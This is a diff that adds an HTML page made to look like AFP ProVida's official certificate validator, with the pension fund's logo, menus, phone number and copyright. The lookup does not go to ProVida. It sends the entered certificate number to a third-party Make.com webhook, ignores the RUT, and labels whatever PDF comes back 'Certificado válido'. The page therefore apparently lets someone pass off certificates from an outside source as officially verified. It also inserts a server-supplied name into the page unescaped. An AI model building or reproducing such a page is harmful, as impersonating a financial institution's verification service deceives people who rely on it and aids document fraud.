@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Validador de Certificados – ProVida AFP</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Roboto', sans-serif; background: #f5f7fa; color: #333; min-height: 100vh; display: flex; flex-direction: column; }
+
+    /* ── NAVBAR ── */
+    .navbar { background: #fff; padding: 14px 40px; display: flex; align-items: center; gap: 16px; box-shadow: 0 2px 8px rgba(0,0,0,.07); }
+    .navbar img { height: 46px; object-fit: contain; }
+    .navbar nav { display: flex; gap: 4px; margin-left: 20px; }
+    .navbar nav a { font-size: 0.88rem; color: #333; text-decoration: none; padding: 8px 14px; font-weight: 500; }
+    .navbar nav a:hover { color: #1a6b9a; }
+    .navbar .btn-sucursal { margin-left: auto; background: none; border: 1.5px solid #1a6b9a; color: #1a6b9a; padding: 8px 18px; border-radius: 4px; font-size: 0.85rem; font-weight: 600; text-decoration: none; display: flex; align-items: center; gap: 6px; }
+    .navbar .btn-search { background: none; border: none; cursor: pointer; color: #555; padding: 8px; font-size: 1.2rem; }
+
+    /* ── BREADCRUMB ── */
+    .breadcrumb { padding: 10px 40px; font-size: 0.78rem; color: #888; display: flex; align-items: center; gap: 6px; background: #f5f7fa; }
+    .breadcrumb a { color: #1a6b9a; text-decoration: none; }
+    .breadcrumb svg { opacity: 0.5; }
+
+    /* ── HERO ── */
+    .hero { background: linear-gradient(135deg, #1a6b9a 0%, #2ecc8a 100%); padding: 60px 40px; }
+    .hero h1 { color: #fff; font-size: 2.2rem; font-weight: 700; }
+
+    /* ── FORM SECTION ── */
+    .form-section { padding: 0 40px 60px; max-width: 900px; margin: 0 auto; width: 100%; }
+
+    .intro-text { font-size: 0.92rem; color: #555; line-height: 1.65; padding: 24px 0; }
+    .intro-text strong { color: #333; }
+
+    /* ── THE CARD ── */
+    .validator-card { background: linear-gradient(135deg, #1a6b9a 0%, #2ecc8a 100%); border-radius: 8px; padding: 4px; }
+    .validator-card-inner { background: #fff; border-radius: 6px 6px 0 0; padding: 28px 32px 36px; }
+    .validator-card-inner h2 { color: #fff; font-size: 1.35rem; font-weight: 700; text-align: center; padding: 20px 32px 24px; background: linear-gradient(135deg, #1a6b9a 0%, #2ecc8a 100%); border-radius: 6px 6px 0 0; margin: -28px -32px 28px; }
+
+    .field-outline { border: 1.5px solid #c0c8d0; border-radius: 6px; padding: 14px 18px; margin-bottom: 16px; transition: border-color .2s; }
+    .field-outline:focus-within { border-color: #1a6b9a; }
+    .field-outline input { width: 100%; border: none; font-family: 'Roboto', sans-serif; font-size: 1rem; color: #333; outline: none; background: transparent; }
+    .field-outline input::placeholder { color: #aaa; }
+
+    .btn-validar { width: 100%; padding: 14px; background: #1a7cbf; color: #fff; border: none; border-radius: 6px; font-family: 'Roboto', sans-serif; font-size: 0.95rem; font-weight: 600; cursor: pointer; transition: background .2s; margin-top: 4px; }
+    .btn-validar:hover { background: #155d99; }
+    .btn-validar:disabled { background: #a0c4e0; cursor: not-allowed; }
+
+    .spinner { display: none; text-align: center; padding: 20px 0; }
+    .spinner.active { display: block; }
+    .spinner svg { animation: spin .9s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .result-box { display: none; margin-top: 20px; border-radius: 6px; overflow: hidden; border: 1px solid #ddd; }
+    .result-box.visible { display: block; }
+    .result-header { padding: 12px 18px; font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
+    .result-header.success { background: #e8f5e9; color: #2e7d32; border-bottom: 2px solid #2e7d32; }
+    .result-header.error { background: #ffebee; color: #c62828; border-bottom: 2px solid #c62828; }
+    .result-body { padding: 18px; background: #fff; }
+    .result-body .name { font-size: 1rem; font-weight: 700; margin-bottom: 14px; }
+    .btn-pdf { display: inline-flex; align-items: center; gap: 7px; background: #1a7cbf; color: #fff; padding: 9px 18px; border-radius: 4px; font-size: 0.88rem; font-weight: 600; cursor: pointer; border: none; font-family: 'Roboto', sans-serif; transition: background .2s; }
+    .btn-pdf:hover { background: #155d99; }
+
+    /* ── CTA BANNER ── */
+    .cta-banner { background: #1a2744; display: flex; align-items: center; border-radius: 0 0 0 0; overflow: hidden; margin-top: 32px; }
+    .cta-banner .img-side { background: linear-gradient(135deg, #1a6b9a, #2ecc8a); width: 220px; min-height: 120px; display: flex; align-items: center; justify-content: center; padding: 20px; color: #fff; font-weight: 700; font-size: 0.95rem; text-align: center; }
+    .cta-banner .text-side { padding: 28px 32px; color: #fff; flex: 1; }
+    .cta-banner .text-side h3 { font-size: 1.3rem; margin-bottom: 10px; }
+    .cta-banner .text-side p { font-size: 0.88rem; opacity: 0.85; margin-bottom: 16px; }
+    .cta-banner .text-side a { border: 2px solid #fff; color: #fff; padding: 8px 20px; font-size: 0.82rem; font-weight: 700; text-decoration: none; letter-spacing: .05em; }
+
+    /* ── FOOTER ── */
+    .footer { background: #f5f7fa; border-top: 1px solid #e0e4e8; padding: 32px 40px; }
+    .footer img { height: 36px; object-fit: contain; margin-bottom: 20px; }
+    .footer-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 16px; font-size: 0.82rem; }
+    .footer-col h4 { color: #333; font-weight: 600; margin-bottom: 10px; font-size: 0.85rem; }
+    .footer-col a { display: block; color: #666; text-decoration: none; margin-bottom: 5px; }
+    .footer-copy { text-align: center; padding: 14px; font-size: 0.75rem; color: #999; border-top: 1px solid #e0e4e8; margin-top: 28px; }
+  </style>
+</head>
+<body>
+
+<div class="navbar">
+  <img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/LOGO%20PROVIDA.png" alt="ProVida AFP"/>
+  <nav>
+    <a href="#">CÁMBIATE ▾</a>
+    <a href="#">TRÁMITES Y SERVICIOS ▾</a>
+    <a href="#">TU PENSIÓN ▾</a>
+    <a href="#">AHORROS Y RENTABILIDAD ▾</a>
+    <a href="#">AYUDA ▾</a>
+  </nav>
+  <a href="#" class="btn-sucursal">👤 Sucursal Virtual</a>
+  <button class="btn-search">🔍</button>
+</div>
+
+<div class="breadcrumb">
+  🏠 &gt; <a href="#">Trámites y Servicios en Línea</a> &gt; <a href="#">Certificados</a> &gt; <strong>Validador de Certificados</strong>
+</div>
+
+<div class="hero">
+  <h1>Valida tus Certificados</h1>
+</div>
+
+<div style="padding: 0 40px; max-width: 900px; margin: 0 auto; width: 100%;">
+  <div class="intro-text">
+    <p><strong>Te contamos cómo validar tu certificado según el formato de tu documento.</strong></p>
+    <br/>
+    <p>• <strong>Si obtuviste tu certificado en una Sucursal</strong>, tendrás un número de folio con 16 a 18 dígitos. Para validarlo, puedes llamarnos al Contact Center al 600 201 0150 de lunes a jueves de 8:30 a 17:00 hrs. y los viernes hasta las 16:30 hrs.</p>
+    <br/>
+    <p>• <strong>Si obtuviste tu certificado por un canal digital</strong> tendrá entre 8 y 9 dígitos. Puedes validarlo aquí, en el Validador de Certificados:</p>
+  </div>
+
+  <div class="validator-card">
+    <div class="validator-card-inner">
+      <h2>Validador de Certificados</h2>
+
+      <div class="field-outline">
+        <input type="text" id="rut" placeholder="RUT" maxlength="12"/>
+      </div>
+
+      <div class="field-outline">
+        <input type="text" id="folio" placeholder="Número de Certificado"/>
+      </div>
+
+      <button class="btn-validar" id="btn-validar" onclick="validar()">Validar certificado</button>
+
+      <div class="spinner" id="spinner">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
+          <circle cx="12" cy="12" r="10" stroke="#e0e0e0" stroke-width="3"/>
+          <path d="M12 2a10 10 0 0 1 10 10" stroke="#1a7cbf" stroke-width="3" stroke-linecap="round"/>
+        </svg>
+        <p style="margin-top:6px;color:#888;font-size:0.85rem;">Consultando...</p>
+      </div>
+
+      <div class="result-box" id="result-box">
+        <div class="result-header" id="result-header"></div>
+        <div class="result-body" id="result-body"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="cta-banner">
+    <div class="img-side">Por algo<br/><strong>tantas personas<br/>nos eligen</strong></div>
+    <div class="text-side">
+      <h3>Si aún no estás en ProVida, te esperamos</h3>
+      <p>Cámbiate con nosotros 100% online, sin costo y en pocos pasos.</p>
+      <a href="#">QUIERO CAMBIARME</a>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <img src="https://49659256.fs1.hubspotusercontent-na1.net/hubfs/49659256/PDFS/LOGOS%20AFP/LOGO%20PROVIDA.png" alt="ProVida AFP"/>
+  <div class="footer-grid">
+    <div class="footer-col"><h4>Trámites y Servicios</h4><a href="#">Trámites en línea</a><a href="#">Obtén tus Certificados</a><a href="#">Tu Cartola</a><a href="#">Contáctanos</a></div>
+    <div class="footer-col"><h4>Tus Ahorros y Pensión</h4><a href="#">Tus Ahorros para tu Pensión</a><a href="#">APV y Depósito Convenido</a><a href="#">Tu Cuenta de Ahorro</a></div>
+    <div class="footer-col"><h4>Rentabilidad y Multifondos</h4><a href="#">Todo sobre Multifondos</a><a href="#">Rentabilidad de los Fondos</a></div>
+    <div class="footer-col"><h4>Empleadores</h4><a href="#">Pago de cotizaciones</a><a href="#">Subsidios y Beneficios</a></div>
+    <div class="footer-col"><h4>Sobre ProVida</h4><a href="#">¿Quiénes Somos?</a><a href="#">Información Financiera</a></div>
+  </div>
+  <div class="footer-copy">AFP ProVida S.A. &copy; 2026 — Contact Center: 600 201 0150</div>
+</div>
+
+<script>
+  const WEBHOOK = 'https://hook.us2.make.com/iq6ps3txx1jaxr91mje7sx47ynbta3kb';
+
+  async function validar() {
+    const rut   = document.getElementById('rut').value.trim();
+    const folio = document.getElementById('folio').value.trim();
+    const uuid  = folio;
+    if (!rut || !folio) { alert('Por favor ingresa el RUT y el folio del certificado.'); return; }
+    const btn = document.getElementById('btn-validar');
+    btn.disabled = true;
+    document.getElementById('spinner').classList.add('active');
+    document.getElementById('result-box').classList.remove('visible');
+
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 30000);
+
+    try {
+      const res = await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({ uuid: uuid, afp: 'Provida' }),
+        signal: controller.signal
+      });
+      clearTimeout(timeout);
+      const data = await res.json();
+      document.getElementById('spinner').classList.remove('active');
+      const box = document.getElementById('result-box');
+      const hdr = document.getElementById('result-header');
+      const bdy = document.getElementById('result-body');
+      if (data.found === true && data.pdf) {
+        hdr.className = 'result-header success';
+        hdr.innerHTML = '<svg width="16" height="16" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#2e7d32"/><path d="M8 12l3 3 5-5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg> Certificado válido';
+        const pdfData = data.pdf.startsWith('data:') ? data.pdf : 'data:application/pdf;base64,' + data.pdf;
+        bdy.innerHTML = '<div class="name">' + (data.name || 'Certificado encontrado') + '</div>' +
+          '<div style="margin-top:12px;border:1px solid #ddd;border-radius:4px;overflow:hidden;">' +
+          '<iframe src="' + pdfData + '" style="width:100%;height:500px;border:none;" title="Certificado PDF"></iframe></div>';
+      } else if (data.found === false) {
+        hdr.className = 'result-header error';
+        hdr.innerHTML = '<svg width="16" height="16" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#c62828"/><path d="M15 9l-6 6M9 9l6 6" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg> Certificado no encontrado';
+        bdy.innerHTML = '<p style="color:#555;font-size:0.9rem;">No se encontró ningún certificado con los datos ingresados.</p>';
+      } else {
+        hdr.className = 'result-header error';
+        hdr.innerHTML = '⚠️ Respuesta inesperada del servidor.';
+        bdy.innerHTML = '<p style="color:#555;font-size:0.9rem;">Intenta nuevamente en unos minutos.</p>';
+      }
+      box.classList.add('visible');
+    } catch(err) {
+      clearTimeout(timeout);
+      document.getElementById('spinner').classList.remove('active');
+      const box = document.getElementById('result-box');
+      const hdr = document.getElementById('result-header');
+      const bdy = document.getElementById('result-body');
+      hdr.className = 'result-header error';
+      if (err.name === 'AbortError') {
+        hdr.innerHTML = '⚠️ Tiempo de espera agotado.';
+        bdy.innerHTML = '<p style="color:#555;font-size:0.9rem;">El servidor tardó demasiado. Intenta nuevamente.</p>';
+      } else {
+        hdr.innerHTML = '⚠️ No se pudo conectar con el servidor.';
+        bdy.innerHTML = '<p style="color:#555;font-size:0.9rem;">Verifica tu conexión e intenta nuevamente.</p>';
+      }
+      box.classList.add('visible');
+    } finally {
+      btn.disabled = false;
+    }
+  }
+
+  window.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('rut').addEventListener('keydown', e=>{ if(e.key==='Enter') document.getElementById('folio').focus(); });
+    document.getElementById('folio').addEventListener('keydown', e=>{ if(e.key==='Enter') validar(); });
+  });
+</script>
+</body>
+</html>
